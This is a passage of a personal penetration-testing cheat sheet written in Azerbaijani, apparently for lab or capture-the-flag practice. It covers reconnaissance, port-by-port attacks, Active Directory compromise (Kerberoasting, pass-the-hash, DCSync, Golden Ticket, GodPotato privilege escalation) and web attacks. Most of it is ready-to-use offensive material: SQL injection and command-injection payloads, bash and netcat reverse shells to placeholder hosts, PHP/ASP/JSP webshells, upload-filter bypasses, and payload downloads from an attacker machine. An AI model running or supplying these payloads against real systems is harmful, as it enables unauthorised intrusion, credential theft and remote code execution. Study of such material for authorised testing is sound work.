https://notepad-plum.vercel.app/auth

**Sənin verdiyin:**
- https://gtfobins.github.io/ — Linux binary-ləri ilə priv-esc / GTFOBins (sənin yazdığın `.org` → əsl ünvan budur)
- https://www.pentest-book.com/ — pentest qeydləri / metodologiya
- https://regex101.com/ — regex qur və test et (log analizdə əla)

**Priv-Esc & Binary abuse:**
- https://lolbas-project.github.io/ — LOLBAS (Windows-da GTFOBins ekvivalenti)
- https://wadcoms.github.io/ — Windows/AD hücum komandaları (interaktiv)

**Ən vacib biliklər bazası:**
- https://book.hacktricks.xyz/ — HACKTRICKS (hər mövzu üzrə "müqəddəs kitab")
- https://swisskyrepo.github.io/PayloadsAllTheThings/ — bütün payload-lar (SQLi, SSTI, XXE, LFI...)
- https://hideandsec.sh/ — AD & internal pentest metodologiya

**Payload / encode / decode:**
- https://www.revshells.com/ — reverse shell generator (bütün dillərdə)
- https://gchq.github.io/CyberChef/ — CyberChef (encode/decode/base64/hex/rot...)
- https://www.urlencoder.org/ — URL encode (web hücumlarda filtr bypass)

**Hash & parol:**
- https://crackstation.net/ — onlayn hash lookup (MD5, SHA1, NTLM)
- https://hashcat.net/wiki/doku.php?id=example_hashes — hashcat mode nömrələri
- https://md5decrypt.net/ — alternativ hash lookup

**Köməkçi:**
- https://explainshell.com/ — istənilən shell komandasını izah edir
- https://www.exploit-db.com/ — public exploit-lər (searchsploit ilə eyni baza)
- https://gtfoargs.github.io/ — argument injection üçün

---

## 0. RECON & ENUMERATION (Ümumi başlanğıc)

```bash
# Host kəşfi
nmap -sn 10.10.10.0/24                      # ping sweep
nmap -p- --min-rate 5000 <IP>               # bütün portlar
nmap -sC -sV -p<ports> <IP> -oN scan.txt    # service + script

# RustScan — quraşdırma (wget ilə .deb)
wget https://github.com/RustScan/RustScan/releases/download/2.1.1/rustscan_2.1.1_amd64.deb
sudo dpkg -i rustscan_2.1.1_amd64.deb
#   ən son versiya:  https://github.com/RustScan/RustScan/releases
#   alternativ (cargo ilə):  cargo install rustscan

# RustScan — istifadə (nmap-dan çox sürətli port tapır)
rustscan -a <IP>                            # bütün portları tez tap
rustscan -a <IP> -- -sC -sV                 # tapıb birbaşa nmap-a ötür
rustscan -a <IP> --range 1-65535 -- -A      # tam aralıq + aqressiv
rustscan -a <IP> -b 500                     # batch size (sürət tənzimi)

# Web enumeration
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://<IP>/FUZZ -w wordlist.txt -mc 200,301,302
whatweb http://<IP>
nikto -h http://<IP>

# Subdomain / vhost
ffuf -u http://<IP> -H "Host: FUZZ.target.com" -w subs.txt -fs <size>
```

### 🔌 PORTLAR — açıq olanda nə yoxla / hansı hücum

| Port | Servis | Açıq olanda nə et / hücum növü |
|------|--------|-------------------------------|
| **21** | FTP | anonymous login (`ftp <IP>` → anonymous), fayl yüklə/endir, `ftp-anon` nmap script |
| **22** | SSH | brute-force (hydra), zəif key, user enum; tapılan creds ilə login |
| **23** | Telnet | şifrəsiz protokol, sniffing, default creds |
| **25** | SMTP | user enum (VRFY/EXPN), open relay, email spoofing |
| **53** | DNS | zone transfer (`dig axfr @<IP> domain`), subdomain enum |
| **80 / 443** | HTTP/HTTPS | **əsas web hücumlar**: dir brute (gobuster), SQLi, LFI, IDOR, SSRF, RCE |
| **88** | Kerberos | **AD!** AS-REP roasting, Kerberoasting, ticket hücumları |
| **110/143** | POP3/IMAP | email creds brute, məktub oxu |
| **111** | RPCbind | NFS share-ləri tap (`showmount -e <IP>`) |
| **135** | MSRPC | `rpcclient`, endpoint enum |
| **139 / 445** | SMB/NetBIOS | **AD!** null session, share enum (`smbclient`,`smbmap`), EternalBlue, PtH |
| **161** | SNMP | `snmpwalk -c public -v1 <IP>` → məlumat sızması (user, proses) |
| **389 / 636** | LDAP/LDAPS | **AD!** `ldapsearch` ilə domain enum, user/group çıxart |
| **1433** | MSSQL | brute, `mssqlclient`, `xp_cmdshell` ilə RCE |
| **1521** | Oracle DB | TNS enum, brute (odat) |
| **2049** | NFS | `mount -t nfs`, no_root_squash → priv-esc |
| **3000/8000/8080** | Web (alt) | dev/admin panellər, API, proxy → web hücumlar |
| **3306** | MySQL | brute, login (`mysql -h <IP> -u root`), DB dump |
| **3389** | RDP | brute (hydra/crowbar), creds ilə `xfreerdp`, BlueKeep |
| **5432** | PostgreSQL | brute, login, `COPY ... TO PROGRAM` ilə RCE |
| **5985 / 5986** | WinRM | **AD!** `evil-winrm -i <IP> -u user -p pass` → shell |
| **6379** | Redis | auth yoxdursa RCE (SSH key yaz / webshell) |
| **27017** | MongoDB | auth yoxdursa data dump |

```bash
# Port-spesifik enum nümunələri
ftp <IP>                                     # 21 → anonymous
dig axfr @<IP> domain.local                  # 53 → zone transfer
showmount -e <IP>                            # 111/2049 → NFS share
snmpwalk -c public -v1 <IP>                  # 161 → SNMP
ldapsearch -x -H ldap://<IP> -b "dc=x,dc=y"  # 389 → LDAP
evil-winrm -i <IP> -u user -p pass           # 5985 → WinRM shell
redis-cli -h <IP>                            # 6379 → Redis
```

#### 🎯 Port üzrə HÜCUM komandaları

```bash
### 21 FTP
nmap --script ftp-anon,ftp-syst -p21 <IP>
ftp <IP>            # user: anonymous, pass: (boş)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP>
# fayl: get file.txt | yüklə: put shell.php | binary: binary

### 22 SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
ssh user@<IP>                          # tapılan creds ilə
ssh -i id_rsa user@<IP>                # key tapsan
chmod 600 id_rsa                       # "permissions too open" xətası üçün
ssh2john id_rsa > hash ; john hash     # parollu key crack

### 25 SMTP — user enum
smtp-user-enum -M VRFY -U users.txt -t <IP>
nc <IP> 25  → VRFY root / EXPN admin

### 53 DNS — zone transfer
dig axfr @<IP> domain.local
dnsenum domain.local ; fierce --domain domain.local

### 80/443 HTTP — web hücumlar
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
nikto -h http://<IP>
# sonra: SQLi, LFI, IDOR, SSRF (yuxarıdakı II bölmə)

### 139/445 SMB
crackmapexec smb <IP> -u '' -p ''                    # null session
crackmapexec smb <IP> -u user -p pass --shares       # share-lər
smbclient //<IP>/share -U user                       # qoşul
crackmapexec smb <IP> -u user -H <NTLM>              # Pass-the-Hash
nmap --script smb-vuln-ms17-010 -p445 <IP>          # EternalBlue yoxla

### 161 SNMP
snmpwalk -c public -v1 <IP>
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25   # userlər
onesixtyone -c community.txt <IP>                    # community brute

### 389 LDAP
ldapsearch -x -H ldap://<IP> -b "dc=lab,dc=local"
ldapsearch -x -H ldap://<IP> -b "dc=lab,dc=local" "(objectClass=user)"

### 1433 MSSQL
impacket-mssqlclient user:pass@<IP>
hydra -L users.txt -P pass.txt mssql://<IP>
# içəridə RCE:  EXEC xp_cmdshell 'whoami';
#   aktiv et:   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

### 3306 MySQL
mysql -h <IP> -u root -p
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mysql://<IP>

### 3389 RDP
hydra -L users.txt -P pass.txt rdp://<IP>
xfreerdp /u:user /p:pass /v:<IP>
xfreerdp /u:user /pth:<NTLM> /v:<IP>     # Pass-the-Hash RDP

### 5985 WinRM (AD shell)
crackmapexec winrm <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -H <NTLM>     # hash ilə

### 6379 Redis (auth yoxdursa)
redis-cli -h <IP>
  > info
  > config get dir
# webshell / SSH key yazma texnikası → HackTricks "Redis" bölməsi

### 2049 NFS
showmount -e <IP>
mkdir /tmp/nfs ; mount -t nfs <IP>:/share /tmp/nfs
# no_root_squash → SUID binary qoy → priv-esc
```

#### 🔑 İÇƏRİ GİRƏNDƏN SONRA — interaktiv komandalar

```bash
### FTP shell (ftp <IP> qoşulandan sonra)
ls / dir            # faylları gör
binary              # binary rejim (exe/şəkil üçün vacib!)
ascii               # text rejim
get flag.txt        # endir
put shell.php       # yüklə
cd /path            # qovluq dəyiş
mget *              # hamısını endir
bye / quit          # çıx

### MySQL shell (mysql -h <IP> -u root -p sonrası)
SHOW DATABASES;
USE dbname;
SHOW TABLES;
DESCRIBE users;                    # sütunları gör
SELECT * FROM users;
SELECT user,password FROM mysql.user;   # parol hashları
SELECT load_file('/etc/passwd');        # fayl oxu (FILE priv)
-- webshell yaz:
SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/sh.php';

### MSSQL shell (impacket-mssqlclient sonrası)
SELECT name FROM sys.databases;
SELECT @@version;
enable_xp_cmdshell                 # impacket-də qısa komanda
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';         # RCE!
xp_cmdshell whoami                 # impacket qısa forma

### PostgreSQL shell (psql)
\l                                 # DB-ləri sadala
\c dbname                          # DB-yə qoşul
\dt                                # cədvəllər
\d users                           # sütunlar
SELECT * FROM users;
COPY (SELECT '') TO PROGRAM 'id';  # RCE (superuser)

### Redis (redis-cli -h <IP> sonrası)
INFO
CONFIG GET dir
KEYS *                             # bütün açarlar
GET <key>
CONFIG SET dir /var/www/html       # webshell yazma hazırlığı
CONFIG SET dbfilename shell.php

### smbclient shell (smbclient //<IP>/share sonrası)
ls ; dir
get flag.txt                       # endir
put shell.exe                      # yüklə
cd folder
recurse ON ; prompt OFF ; mget *   # hamısını rekursiv endir
exit

### rpcclient shell (rpcclient -U "" -N <IP> sonrası)
enumdomusers                       # bütün domain userlər
enumdomgroups
queryuser <RID>                    # user detalı
querydominfo                       # domain məlumatı
getdompwinfo                       # parol siyasəti
lookupnames administrator          # ad → SID

### evil-winrm (PowerShell shell - AD)
whoami /priv
upload local.exe C:\Temp\f.exe     # fayl yüklə (built-in)
download C:\flag.txt               # fayl endir (built-in)
menu                               # əlavə modullar (Invoke-Binary, Bypass-4MSI)
```

---

## I. ACTIVE DIRECTORY ATTACK

### 1.1 Domain Enumeration
```bash
# SMB / null session
smbclient -L //<IP> -N
smbmap -H <IP> -u '' -p ''
crackmapexec smb <IP> -u '' -p ''

# SMB OS & domain məlumatı (OS versiyası, hostname, domain, uptime)
nmap --script smb-os-discovery -p445 <IP>
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p139,445 <IP>
nmap --script "smb-vuln-*" -p445 <IP>      # SMB zəifliklərini yoxla (EternalBlue və s.)

# RPC enumeration
rpcclient -U "" -N <IP>
  > enumdomusers
  > enumdomgroups
  > querydominfo

# LDAP
ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=local"
nmap -p389 --script ldap-search <IP>

# enum4linux
enum4linux -a <IP>
```

### 1.2 BloodHound (Graph Recon)
```bash
# Data toplama (remote)
bloodhound-python -u user -p pass -d domain.local -ns <DC-IP> -c all

# Sneaky_collector / SharpHound (Windows)
SharpHound.exe -c All

# BloodHound GUI: neo4j start → import .json
```

### 1.3 Kerberos Hücumları
```bash
# AS-REP Roasting (preauth disabled olan userlər)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <IP>
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash

# Kerberoasting (SPN olan service accountlar)
impacket-GetUserSPNs domain.local/user:pass -dc-ip <IP> -request
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash

# -no-pass variantı (TGT artıq varsa və ya null auth icazəlidirsə)
impacket-GetUserSPNs -request lab.local/SHAWN_SANCHEZ -dc-ip 192.168.73.128 -no-pass
# → çıxan $krb5tgs$ hash-i fayla yaz, sonra crack et:
hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt spn.hash

# Password spraying
crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success
kerbrute passwordspray -d domain.local users.txt Password123
```

#### 🎯 KERBEROASTING — TAM ZƏNCIR (recon → WinRM shell)

```bash
# ════════════════════════════════════════════════════════════
# ADDIM 0 — RECON: DC-ni və domain adını tap
# ════════════════════════════════════════════════════════════
rustscan -a <IP> -- -sC -sV
# Açıq portlar: 53,88(Kerberos),135,139,389(LDAP),445(SMB),5985(WinRM)...
# 88 + 389 + 445 görürsənsə → bu Domain Controller-dir

nmap --script smb-os-discovery -p445 <IP>     # hostname, domain, FQDN
# Domain adını yadda saxla, məs:  lab.local   |   DC: DC01.lab.local

# /etc/hosts-a əlavə et (Kerberos ad həllinə görə VACIBDIR):
echo "<IP>  lab.local DC01.lab.local DC01" | sudo tee -a /etc/hosts

# Saatı DC ilə sinxronla (Kerberos clock skew xətasının qarşısını alır):
sudo ntpdate <IP>      # və ya:  sudo rdate -n <IP>

# ════════════════════════════════════════════════════════════
# ADDIM 1 — USER SİYAHISI topla (kerberoast üçün lazım)
# ════════════════════════════════════════════════════════════
# A) Null session işləyirsə:
crackmapexec smb <IP> -u '' -p '' --users
rpcclient -U "" -N <IP> -c "enumdomusers"
enum4linux -U <IP>
# B) RID brute (null tam bağlıdırsa):
crackmapexec smb <IP> -u guest -p '' --rid-brute
# C) Kerbrute ilə user mövcudluğunu yoxla (auth lazım deyil):
kerbrute userenum -d lab.local --dc <IP> /usr/share/wordlists/usernames.txt
# → tapılan userləri users.txt-ə yığ

# ════════════════════════════════════════════════════════════
# ADDIM 2 — KERBEROASTING: SPN ticket-lərini istə
# ════════════════════════════════════════════════════════════
# Ən azı 1 keçərli domain user lazımdır (parol və ya hash).
# Creds varsa:
impacket-GetUserSPNs lab.local/SHAWN_SANCHEZ:'Password123' -dc-ip <IP> -request -outputfile kerb.hash
# Yalnız user var, parol yoxdursa (-no-pass — AS-REP/null icazəlidirsə):
impacket-GetUserSPNs -request lab.local/SHAWN_SANCHEZ -dc-ip <IP> -no-pass -outputfile kerb.hash
# Konkret SPN account-ı hədəflə:
impacket-GetUserSPNs lab.local/user:pass -dc-ip <IP> -request-user sqlsvc

# Nəticə: $krb5tgs$23$*sqlsvc$LAB.LOCAL$...  → kerb.hash faylında

# ════════════════════════════════════════════════════════════
# ADDIM 3 — HASH-İ CRACK ET (offline)
# ════════════════════════════════════════════════════════════
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# və ya john:
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
hashcat -m 13100 kerb.hash --show          # crack olunmuş parolu göstər
# → məs:  sqlsvc : Summer2024!

# ════════════════════════════════════════════════════════════
# ADDIM 4 — CREDS-İ TƏSDİQLƏ (hansı protokol açıqdır?)
# ════════════════════════════════════════════════════════════
crackmapexec smb <IP> -u sqlsvc -p 'Summer2024!'        # (Pwn3d! = admin)
crackmapexec winrm <IP> -u sqlsvc -p 'Summer2024!'      # WinRM icazəsi?
crackmapexec ldap <IP> -u sqlsvc -p 'Summer2024!'
# "Pwn3d!" görsən → həmin protokolla shell ala bilərsən

# ════════════════════════════════════════════════════════════
# ADDIM 5 — WINRM SHELL (5985 açıq + icazə varsa)
# ════════════════════════════════════════════════════════════
evil-winrm -i <IP> -u sqlsvc -p 'Summer2024!'
# içəridə:
#   whoami /priv          → SeImpersonate varsa → GodPotato (priv-esc)
#   type C:\Users\sqlsvc\Desktop\user.txt
#   upload GodPotato-NET4.exe  /  download flag.txt

# ════════════════════════════════════════════════════════════
# ADDIM 6 — (əgər user deyil, admin lazımdırsa) PRIV-ESC / DCSync
# ════════════════════════════════════════════════════════════
# WinRM user-i admin deyilsə: BloodHound ilə yol tap, ya da:
impacket-secretsdump lab.local/sqlsvc:'Summer2024!'@<IP> -just-dc   # DCSync (hüquq varsa)
```

> ⚠️ Tez-tez rast gəlinən xətalar:
> • `KRB_AP_ERR_SKEW` → saat fərqi, `ntpdate <IP>` ilə düzəlt
> • `Kerberos SessionError` → /etc/hosts-da domain/FQDN yazılmayıb
> • SPN tapılmır → həmin user account-da SPN yoxdur, başqa user sına

### 1.4 Credential Access & Lateral Movement
```bash
# Hash ilə login (Pass-the-Hash)
crackmapexec smb <IP> -u user -H <NTLM_hash>
impacket-psexec domain/user@<IP> -hashes :<NTLM>
impacket-wmiexec domain/user@<IP> -hashes :<NTLM>
evil-winrm -i <IP> -u user -H <NTLM>

# Secrets dump
impacket-secretsdump domain/user:pass@<IP>
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# Mimikatz (Windows target)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

### 1.5 Privilege Escalation / Domain Dominance
```bash
# Golden Ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain domain.local administrator

# DCSync
impacket-secretsdump -just-dc domain/user:pass@<DC-IP>

# Windows priv-esc enum
winPEAS.exe
PowerUp.ps1 → Invoke-AllChecks
whoami /priv          # SeImpersonate → PrintSpoofer / JuicyPotato / GodPotato

# ┌─────────────────────────────────────────────────────────────┐
# │ ŞƏRT: whoami /priv çıxışında bu görünməlidir:                │
# │   SeImpersonatePrivilege        Enabled                     │
# │   (və ya SeAssignPrimaryTokenPrivilege)                     │
# │ → BU OLANDA aşağıdakı potato hücumları işləyir (SYSTEM-ə)   │
# └─────────────────────────────────────────────────────────────┘

# GodPotato — SeImpersonatePrivilege abuse ilə SYSTEM/Admin (NET4 üçün)
# 1) faylı target maşına yüklə (məs. impacket-smbserver, certutil, evil-winrm upload)
upload /home/fikrat/Godpotato/GodPotato-NET4.exe
# 2) komanda icra et (flag oxumaq nümunəsi):
C:\Users\SHAWN_SANCHEZ\Downloads\GodPotato-NET4.exe -cmd "cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt"
# 3) tam reverse shell üçün:
GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
GodPotato-NET4.exe -cmd "nc.exe <IP> 4444 -e cmd.exe"

# Digər potato variantları (eyni şərt: SeImpersonatePrivilege)
PrintSpoofer64.exe -i -c cmd.exe
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *

### FAYL TRANSFERİ (target-ə fayl atmaq — məs. GodPotato.exe)

# 0) GodPotato-nu əvvəlcə öz maşınına GitHub-dan endir (release):
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
#   alternativ (curl ilə, -L = redirect izlə):
curl -L -o GodPotato-NET4.exe https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
#   bütün release-lərə bax: https://github.com/BeichenDream/GodPotato/releases

# 1) Hücumçu maşınında HTTP server qaldır (faylın olduğu qovluqda):
python3 -m http.server 8000
#   (köhnə python2:  python -m SimpleHTTPServer 8000)

# 2) Windows target-də yüklə (PowerShell):
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/GodPotato-NET4.exe -OutFile C:\Users\Public\GodPotato.exe
#   qısa forma:
iwr http://<ATTACKER_IP>:8000/GodPotato.exe -o gp.exe
#   PowerShell köhnə versiya / alternativ:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>:8000/gp.exe','C:\Users\Public\gp.exe')"
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/gp.exe gp.exe

# 3) Linux target-də yüklə:
wget http://<ATTACKER_IP>:8000/linpeas.sh
curl http://<ATTACKER_IP>:8000/linpeas.sh -o linpeas.sh

# SMB server ilə transfer (Windows üçün rahat)
impacket-smbserver share ./ -smb2support
#   target-də:  copy \\<ATTACKER_IP>\share\gp.exe C:\Users\Public\gp.exe
```

---

## II. WEB APPLICATION ATTACKS

### 2.1 IDOR (Insecure Direct Object Reference)
```bash
# ID-ləri dəyişib başqasının resursuna çatmaq
GET /api/user/1001/profile        → /api/user/1002/profile
GET /invoice?id=55                → id=56, id=57 ...

# Burp Intruder / ffuf ilə avtomatlaşdırma
ffuf -u "http://target/api/user/FUZZ" -w nums.txt -H "Cookie: session=..." -mc 200

# Diqqət: GUID, base64, hash-lənmiş ID → decode et
echo "MTAwMQ==" | base64 -d
```

### 2.2 SSRF (Server-Side Request Forgery)
```bash
# Daxili xidmətə sorğu göndərtmək
url=http://127.0.0.1:80/
url=http://localhost/admin
url=http://169.254.169.254/latest/meta-data/   # AWS metadata

# Bypass filtrlər
http://127.0.0.1 → http://0.0.0.0 / http://[::1] / http://2130706433
http://localhost#@evil.com
file:///etc/passwd        # protokol dəyişdirmə
gopher://127.0.0.1:6379/  # daxili servislərə (Redis) payload

# Test üçün dinləyici
nc -lvnp 8000
python3 -m http.server 8000
```

### 2.3 SQL Injection
```bash
# Manual test
' OR '1'='1
' OR 1=1-- -
admin'-- -

# UNION-based
' ORDER BY 5-- -                          # sütun sayını tap
' UNION SELECT 1,2,3,4,5-- -
' UNION SELECT null,table_name,null FROM information_schema.tables-- -
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- -

# Error / Blind
' AND 1=1-- -      (true)
' AND 1=2-- -      (false)
' AND SLEEP(5)-- - (time-based blind)

# sqlmap avtomatlaşdırma
sqlmap -u "http://target/item?id=1" --batch --dbs
sqlmap -u "http://target/item?id=1" -D dbname --tables
sqlmap -u "http://target/item?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3
sqlmap -u "..." --os-shell      # RCE cəhdi
```

#### 2.3.1 UNION-based — sqlmap addım-addım (tam axın)
```bash
# 0) Vulnerable parametri təsdiqlə + yalnız UNION texnikasını məcbur et
sqlmap -u "http://target/item?id=1" --batch --technique=U
#    --technique=U  → yalnız UNION query injection
#    GET üçün ?id=1, POST üçün:  --data="id=1"
#    cookie ilə:  --cookie="PHPSESSID=..."

# 1) UNION-u dəqiq tənzimlə (sütun sayı + inject nöqtəsi əl ilə)
sqlmap -u "http://target/item?id=1" --technique=U \
  --union-cols=5 --union-char=NULL --batch
#    --union-cols   → ORDER BY ilə tapdığın sütun sayı (məs. 5)
#    --union-char   → doldurucu (NULL və ya 1 işləməyəndə)

# 2) DBMS & cari DB / user öyrən
sqlmap -u "http://target/item?id=1" --technique=U --batch \
  --current-db --current-user --hostname --is-dba

# 3) Bütün DB-ləri sadala
sqlmap -u "http://target/item?id=1" --technique=U --batch --dbs

# 4) Seçilmiş DB-də cədvəllər
sqlmap -u "http://target/item?id=1" --technique=U --batch -D <DB> --tables

# 5) Cədvəlin sütunları
sqlmap -u "http://target/item?id=1" --technique=U --batch -D <DB> -T users --columns

# 6) Məlumatı çıxart (dump)
sqlmap -u "http://target/item?id=1" --technique=U --batch -D <DB> -T users -C username,password --dump
sqlmap -u "http://target/item?id=1" --technique=U --batch -D <DB> -T users --dump   # bütün sütunlar
sqlmap -u "http://target/item?id=1" --technique=U --batch -D <DB> --dump-all        # bütün DB
```

#### 2.3.2 Faydalı sqlmap flag-ları
```bash
-p id                      # yalnız bu parametri test et
--dbms=mysql               # DBMS-i göstər (MySQL/MSSQL/PostgreSQL/Oracle)
--level=5 --risk=3         # daha dərin test (UNION variantlarını artırır)
--threads=10               # sürət
--random-agent             # WAF/log bypass üçün User-Agent
--tamper=space2comment     # filtr bypass (digər: between, charencode, equaltolike)
--proxy=http://127.0.0.1:8080   # Burp ilə izlə
--flush-session            # köhnə nəticələri təmizlə, yenidən test et
--dump --batch             # sual vermədən avtomatik dump
```

#### 2.3.3 Manual UNION (sqlmap işləməyəndə)
```sql
-- 1) Sütun sayını tap
' ORDER BY 1-- -   ...   ' ORDER BY 6-- -   (xəta verəndə sayı tapdın)
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -

-- 2) Hansı sütun ekranda görünür (visible/injectable)
' UNION SELECT 1,2,3,4,5-- -        (ekranda hansı rəqəm çıxır?)

-- 3) DB məlumatı (görünən sütuna yaz, məs. 2-ci)
' UNION SELECT 1,version(),3,4,5-- -
' UNION SELECT 1,database(),3,4,5-- -
' UNION SELECT 1,user(),3,4,5-- -

-- 4) Cədvəlləri çıxart
' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -

-- 5) Sütunları çıxart
' UNION SELECT 1,group_concat(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'-- -

-- 6) Datanı çıxart
' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -
--    0x3a = ":" (ayırıcı)
```

### 2.4 Command Injection
```bash
# Separator-lar
; id
| id
|| id
& id
&& whoami
`id`
$(id)

# Filtr bypass
cat${IFS}/etc/passwd          # boşluq əvəzi
c\at /etc/passw\d             # escape
n''slookup / w'h'oami         # quote bypass

# Blind (output görünmür) → OOB / time-based
; ping -c 5 <YOUR_IP>
; curl http://<YOUR_IP>/$(whoami)
; sleep 5

# Reverse shell
; bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
```

### 2.5 File Inclusion (LFI / RFI)
```bash
# LFI
?file=../../../../etc/passwd
?file=....//....//etc/passwd          # filtr bypass
?file=/etc/passwd%00                  # null byte (köhnə PHP)

# PHP wrapper-lər
?file=php://filter/convert.base64-encode/resource=index.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
?file=php://input  (POST body-də PHP kodu)

# Log Poisoning → RCE
# User-Agent-ə <?php system($_GET['c']); ?> yaz, sonra:
?file=/var/log/apache2/access.log&c=id

# RFI (allow_url_include=On olduqda)
?file=http://<YOUR_IP>/shell.txt
```

### 2.6 Advanced Web Attack (XXE / SSTI / Deserialization)
```bash
# XXE — XML External Entity
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

# SSTI — Server-Side Template Injection
{{7*7}}            → 49 deməkdirsə vulnerable
${7*7}  #{7*7}  <%= 7*7 %>
# Jinja2 RCE:
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Insecure Deserialization
ysoserial.jar (Java)
phpggc (PHP gadget chains)

# JWT manipulyasiyası
jwt_tool <token>
# alg:none bypass / zəif secret → hashcat -m 16500
```

### 2.7 File Upload Bypass (webshell yükləmək)
```bash
# === ADDIM 1: Upload nöqtəsini tap ===
# profil şəkli, avatar, sənəd yükləmə, import və s.
# Burp ilə request-i tut → faylın necə yoxlandığını anla
# Yüklənən faylın yolunu tap:  /uploads/ /images/ /files/ /tmp/

# === ADDIM 2: Webshell hazırla (dilə görə) ===
# PHP:
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
# ASP / ASPX:
<% eval request("cmd") %>
# JSP:
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
# Tam reverse shell webshell:
msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php
# Hazır webshell-lər:
/usr/share/webshells/php/php-reverse-shell.php   # IP/port-u içində dəyiş!

# === ADDIM 3: Filtr bypass (yoxlama varsa) ===
# Extension bypass (filtr .php-ni bloklayanda)
shell.phtml / .php3 / .php4 / .php5 / .phar / .pht / .phps
shell.php.jpg / shell.jpg.php          # double extension
shell.pHp / shell.PHP                  # case variation (case-sensitive filtr)
shell.php%00.jpg                       # null byte (köhnə PHP <5.3)
shell.php.                             # trailing dot / space / ::$DATA (Windows)

# Content-Type (MIME) bypass — Burp-da header dəyiş:
Content-Type: image/jpeg               # və ya image/png, application/pdf

# Magic byte bypass (fayl başına imza qoy → "şəkil" kimi görünsün)
GIF89a;<?php system($_GET['cmd']);?>   # GIF imzası
exiftool -Comment='<?php system($_GET["c"]); ?>' real.jpg   # şəkil içinə kod

# .htaccess hiyləsi (Apache) — bu faylı ayrıca yüklə:
AddType application/x-httpd-php .jpg   # .jpg artıq PHP kimi icra olunur

# === ADDIM 4: İcra et (RCE) ===
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=whoami
# Reverse shell tetiklə (dinləyici: nc -lvnp 4444):
http://target/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<IP>/4444+0>%261'

# === ADDIM 5: LFI ilə birləşdirmə (yol gizlidirsə) ===
# Şəkil kimi yüklə (image.jpg içində PHP), sonra LFI ilə icra et:
http://target/?page=/var/www/uploads/image.jpg&cmd=id
```

### 2.8 Authentication Bypass & Default Creds
```bash
# SQLi ilə login bypass (username sahəsinə)
admin'-- -
admin' OR '1'='1
' OR 1=1 LIMIT 1-- -

# Default credentials (ən çox sınananlar)
admin:admin   admin:password   root:root   admin:(boş)
tomcat:tomcat   admin:admin123   guest:guest
# baza: https://default-password.info

# Login brute-force (hydra http-post-form)
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"
#   sonuncu "Invalid" = uğursuz girişdə görünən mətn

# Logic bypass — Burp ilə:
#   Cookie: role=user → role=admin
#   Response {"success":false} → true
```

### HASH CRACKING — JOHN & HASHCAT (lüğət: /usr/share/wordlists/rockyou.txt)
```bash
# rockyou.txt sıxılmışdırsa əvvəlcə aç:
gunzip /usr/share/wordlists/rockyou.txt.gz

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=<format> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                         # crack olunmuş parolu göstər
# faydalı formatlar: raw-md5, raw-sha1, sha512crypt, NT, krb5asrep, krb5tgs, netntlmv2

# Hashcat (-m = mode)
